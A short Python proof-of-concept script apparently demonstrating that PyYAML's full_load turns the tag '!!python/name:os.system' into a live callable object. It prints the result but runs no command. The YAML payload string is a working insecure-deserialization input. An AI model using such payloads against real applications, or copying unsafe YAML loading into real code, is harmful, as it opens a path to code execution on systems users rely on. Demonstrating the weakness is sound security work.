import os
import yaml

# Demonstrates that FullLoader returns live Python objects via !!python/name.
# This is not direct RCE but enables callable injection in app logic.
payload = "!!python/name:os.system ''"

obj = yaml.full_load(payload)
print("returned object:", obj)
print("is callable:", callable(obj))
